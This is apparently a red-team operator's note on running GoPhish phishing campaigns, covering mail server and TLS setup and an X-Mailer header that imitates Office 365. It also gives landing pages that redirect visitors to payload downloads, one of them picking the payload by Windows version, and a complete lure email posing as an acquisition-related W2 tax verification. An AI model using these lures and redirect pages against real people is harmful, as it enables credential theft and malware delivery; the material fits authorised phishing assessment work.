---
creation date: January 3rd 2022
last modified date: January 3rd 2022
aliases: []
tags: #📖
---

Primary Categories: [[01 - Operation]]
Secondary Categories:  [[02 - External]]
Links: [[GoPhish]]
Search Tag: #📖  

# [[GoPhish]]  
Default user - admin 
 
### Mail Hog
Preview your mails before they go out by using the MailHog portal at `gophish0.envXX:8025`

## Setup 
Initial password 
```bash
cd /var/pca/pca-gophish-composition/; docker compose logs gophish | grep password
```

Mail User Passwords
```bash
cd /var/pca/pca-gophish-composition/; docker compose logs postfix | sed -ne '/users and passwords/,/DKIM DNS/p'
```

Portal - https://gophish0:3333

Check the below records using https://whatsmydns.net (CLI tools sometimes miss the underscores in hostnames)
- SPF - TXT, `<domain.com>`
- DMARC - TXT, `_dmarc.<domain.com>`
- DKIM - TXT, `mail._domainkey.<domain.com>`
```bash
cd /var/pca/pca-gophish-composition; docker-compose logs postfix | less -r
```

Test records by using mail-tester.com

### Sending Profiles - Headers 
`X-Mailer` - `Microsoft Office 365 Build 15427.20194`

### Adding Users
Get the container ID of Postfix
```bash
docker container ls
```

Start a bash shell in the Postfix container, add the user, set their password, exit shell
```bash
docker exec -it <CONTAINER ID> bash
adduser <newuser>
exit
```

### Monitoring phish replies, bouncebacks, out-of-office messages
Start Thunderbird (Applications -> Mail Reader)
Add a new account using username@c2domain.com and the password from either the Postfix compose log or a user you manually created. Settings will auto discover.

### Web Server 
#### Install Certbot and Get SSL Certificates
![[Certbot#Installation]]

the FQDN's will typically be `www.domain.com,mail.domain.com`

![[Certbot#Acquire Certificates]]

#### Install Certificates
```bash
cd /var/pca/pca-gophish-composition/secrets/gophish 
sudo cp /etc/letsencrypt/live/<FQDN>/fullchain.pem phish_fullchain.pem
sudo cp /etc/letsencrypt/live/<FQDN>/privkey.pem phish_privkey.pem
sudo chmod +r phish_privkey.pem
```

### Modify Docker environment 

```bash
cd /var/pca/pca-gophish-composition/
sed -i 's/published: 80$/published: 443/g' docker-compose.yml
sed -i 's/use_tls": false/use_tls": true/g' secrets/gophish/config.json
```

### Restart GoPhish
```bash 
sudo systemctl restart pca-gophish-composition.service
```

And now you should be good to serve traffic over HTTPS from GoPhish 

## Landing Pages 

```html
<html><head>
		<meta http-equiv="Refresh" content="0; URL=https://domain.com/payload.ext"/>
</head><body></body></html>
```


```html
<html><head></head><body>
<script>
  window.location.href = "https://some-url/with/some/payload.zip";
</script>

</body></html>
```

OS Detect Redirect
```html
<html><head>
        <title></title>
</head>
<body>
<p>You will be redirected in 3 seconds</p>
    <script>

        if (navigator.userAgent.indexOf("Windows NT 10") != -1 ) {
        var timer = setTimeout(function() {
            window.location="PAYLOAD URL HERE"
                }, 3000);

        } else if (navigator.appVersion.indexOf("Windows NT 6.1") != -1 ) {

        var timer = setTimeout(function() {
            window.location="PAYLOAD URL HERE"
                }, 3000);
        } else if (navigator.appVersion.indexOf("Windows NT 10") != -1 ) {

        var timer = setTimeout(function() {
            window.location="PAYLOAD URL HERE"

        }, 3000);

        }else if (navigator.appVersion.indexOf("Windows NT 6.1") != -1 ) {

        var timer = setTimeout(function() {

            window.location="PAYLOAD URL HERE"

        }, 3000);

        }else {

        var timer = setTimeout(function() {
            window.location="CUSTOMERS_WEBSITE_GOES_HERE"

        }, 3000);

        }

    </script>
</body></html>


```

## Templates 
https://docs.getgophish.com/user-guide/template-reference

**_W2 Verification_**
```html
<!doctype html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title>Simple Transactional Email</title>
	<style type="text/css">/* -------------------------------------
          GLOBAL RESETS
      ------------------------------------- */
      
      /*All the styling goes here*/
      
      img {
        border: none;
        -ms-interpolation-mode: bicubic;
        max-width: 100%; 
      }

      body {
        background-color: #f6f6f6;
        font-family: sans-serif;
        -webkit-font-smoothing: antialiased;
        font-size: 14px;
        line-height: 1.4;
        margin: 0;
        padding: 0;
        -ms-text-size-adjust: 100%;
        -webkit-text-size-adjust: 100%; 
      }

      table {
        border-collapse: separate;
        mso-table-lspace: 0pt;
        mso-table-rspace: 0pt;
        width: 100%; }
        table td {
          font-family: sans-serif;
          font-size: 14px;
          vertical-align: top; 
      }

      /* -------------------------------------
          BODY & CONTAINER
      ------------------------------------- */

      .body {
        background-color: #f6f6f6;
        width: 100%; 
      }

      /* Set a max-width, and make it display as block so it will automatically stretch to that width, but will also shrink down on a phone or something */
      .container {
        display: block;
        margin: 0 auto !important;
        /* makes it centered */
        max-width: 580px;
        padding: 10px;
        width: 580px; 
      }

      /* This should also be a block element, so that it will fill 100% of the .container */
      .content {
        box-sizing: border-box;
        display: block;
        margin: 0 auto;
        max-width: 580px;
        padding: 10px; 
      }

      /* -------------------------------------
          HEADER, FOOTER, MAIN
      ------------------------------------- */
      .main {
        background: #ffffff;
        border-radius: 3px;
        width: 100%; 
      }

      .wrapper {
        box-sizing: border-box;
        padding: 20px; 
      }

      .content-block {
        padding-bottom: 10px;
        padding-top: 10px;
      }

      .footer {
        clear: both;
        margin-top: 10px;
        text-align: center;
        width: 100%; 
      }
        .footer td,
        .footer p,
        .footer span,
        .footer a {
          color: #999999;
          font-size: 12px;
          text-align: center; 
      }

      /* -------------------------------------
          TYPOGRAPHY
      ------------------------------------- */
      h1,
      h2,
      h3,
      h4 {
        color: #000000;
        font-family: sans-serif;
        font-weight: 400;
        line-height: 1.4;
        margin: 0;
        margin-bottom: 30px; 
      }

      h1 {
        font-size: 35px;
        font-weight: 300;
        text-align: center;
        text-transform: capitalize; 
      }

      p,
      ul,
      ol {
        font-family: sans-serif;
        font-size: 14px;
        font-weight: normal;
        margin: 0;
        margin-bottom: 15px; 
      }
        p li,
        ul li,
        ol li {
          list-style-position: inside;
          margin-left: 5px; 
      }

      a {
        color: #3498db;
        text-decoration: underline; 
      }

      /* -------------------------------------
          BUTTONS
      ------------------------------------- */
      .btn {
        box-sizing: border-box;
        width: 100%; }
        .btn > tbody > tr > td {
          padding-bottom: 15px; }
        .btn table {
          width: auto; 
      }
        .btn table td {
          background-color: #ffffff;
          border-radius: 5px;
          text-align: center; 
      }
        .btn a {
          background-color: #ffffff;
          border: solid 1px #3498db;
          border-radius: 5px;
          box-sizing: border-box;
          color: #3498db;
          cursor: pointer;
          display: inline-block;
          font-size: 14px;
          font-weight: bold;
          margin: 0;
          padding: 12px 25px;
          text-decoration: none;
          text-transform: capitalize; 
      }

      .btn-primary table td {
        background-color: #3498db; 
      }

      .btn-primary a {
        background-color: #3498db;
        border-color: #3498db;
        color: #ffffff; 
      }

      /* -------------------------------------
          OTHER STYLES THAT MIGHT BE USEFUL
      ------------------------------------- */
      .last {
        margin-bottom: 0; 
      }

      .first {
        margin-top: 0; 
      }

      .align-center {
        text-align: center; 
      }

      .align-right {
        text-align: right; 
      }

      .align-left {
        text-align: left; 
      }

      .clear {
        clear: both; 
      }

      .mt0 {
        margin-top: 0; 
      }

      .mb0 {
        margin-bottom: 0; 
      }

      .preheader {
        color: transparent;
        display: none;
        height: 0;
        max-height: 0;
        max-width: 0;
        opacity: 0;
        overflow: hidden;
        mso-hide: all;
        visibility: hidden;
        width: 0; 
      }

      .powered-by a {
        text-decoration: none; 
      }

      hr {
        border: 0;
        border-bottom: 1px solid #f6f6f6;
        margin: 20px 0; 
      }

      /* -------------------------------------
          RESPONSIVE AND MOBILE FRIENDLY STYLES
      ------------------------------------- */
      @media only screen and (max-width: 620px) {
        table.body h1 {
          font-size: 28px !important;
          margin-bottom: 10px !important; 
        }
        table.body p,
        table.body ul,
        table.body ol,
        table.body td,
        table.body span,
        table.body a {
          font-size: 16px !important; 
        }
        table.body .wrapper,
        table.body .article {
          padding: 10px !important; 
        }
        table.body .content {
          padding: 0 !important; 
        }
        table.body .container {
          padding: 0 !important;
          width: 100% !important; 
        }
        table.body .main {
          border-left-width: 0 !important;
          border-radius: 0 !important;
          border-right-width: 0 !important; 
        }
        table.body .btn table {
          width: 100% !important; 
        }
        table.body .btn a {
          width: 100% !important; 
        }
        table.body .img-responsive {
          height: auto !important;
          max-width: 100% !important;
          width: auto !important; 
        }
      }

      /* -------------------------------------
          PRESERVE THESE STYLES IN THE HEAD
      ------------------------------------- */
      @media all {
        .ExternalClass {
          width: 100%; 
        }
        .ExternalClass,
        .ExternalClass p,
        .ExternalClass span,
        .ExternalClass font,
        .ExternalClass td,
        .ExternalClass div {
          line-height: 100%; 
        }
        .apple-link a {
          color: inherit !important;
          font-family: inherit !important;
          font-size: inherit !important;
          font-weight: inherit !important;
          line-height: inherit !important;
          text-decoration: none !important; 
        }
        #MessageViewBody a {
          color: inherit;
          text-decoration: none;
          font-size: inherit;
          font-family: inherit;
          font-weight: inherit;
          line-height: inherit;
        }
        .btn-primary table td:hover {
          background-color: #34495e !important; 
        }
        .btn-primary a:hover {
          background-color: #34495e !important;
          border-color: #34495e !important; 
        } 
      }
	</style>
</head>
<body>
<p><span class="preheader">Please complete your W2 Verification in order to receive forms soon.</span></p>

<table border="0" cellpadding="0" cellspacing="0" class="body" role="presentation">
	<tbody>
		<tr>
			<td>&nbsp;</td>
			<td class="container">
			<div class="content"><!-- START CENTERED WHITE CONTAINER -->
			<table class="main" role="presentation"><!-- START MAIN CONTENT AREA -->
				<tbody>
					<tr>
						<td class="wrapper">
						<table border="0" cellpadding="0" cellspacing="0" role="presentation">
							<tbody>
								<tr>
									<td>
									<p>{{.FirstName}},</p>

									<p>With the recent acquisition of {CLIENT} by {XYZ}, all {CLIENT} employees are required to review their W2 information for the upcoming tax season. {XYZ} is required by the Internal Revenue Service to provide each employee with a W-2 Form that states the employee's compensation and tax withholding amounts for calendar year 2021 on or before January 31, 2022.</p>

									<p>In order to receive your W-2 on January 20, 2022 you will need to update your tax information before January 6, 2022. A second round of verification will occur in mid-to-late March. Your forms can currently be retrieved using the secure portal below.</p>

									<p>&nbsp;</p>

									<table border="0" cellpadding="0" cellspacing="0" class="btn btn-primary" role="presentation">
										<tbody>
											<tr>
												<td align="left">
												<table border="0" cellpadding="0" cellspacing="0" role="presentation">
													<tbody>
														<tr>
															<td><a href="{{.URL}}" target="_blank">Complete W2 Verification</a></td>
														</tr>
													</tbody>
												</table>
												</td>
											</tr>
										</tbody>
									</table>
<br>
									<p>- Your friends at {PHISH_DOMAIN}</p>
									</td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
					<!-- END MAIN CONTENT AREA -->
				</tbody>
			</table>
			<!-- END CENTERED WHITE CONTAINER --><!-- START FOOTER -->

			<div class="footer">
			<table border="0" cellpadding="0" cellspacing="0" role="presentation">
				<tbody>
					<tr>
						<td class="content-block"><span class="apple-link">{PHISH_DOMAIN}<br />
						A {XYZ} Affiliate</span></td>
					</tr>
					<tr>
						<td class="content-block powered-by">{CLIENT_ADDRESS}<br />
						{CLIENT_ADDRESS2}</td>
					</tr>
				</tbody>
			</table>
			</div>
			<!-- END FOOTER --></div>
			</td>
			<td>&nbsp;</td>
		</tr>
	</tbody>
</table>
</body>
</html>
```


It is a good idea to copy raw gophish logs to the /share/Working/ directory from here:

```
mkdir /share/Working/GoPhish
cp /docker_data/volumes/pca-gophish-composition_postfix-var/_data/mail/mailarchive /share/Working/GoPhish
```
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: January 3rd 2022 (08:07 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>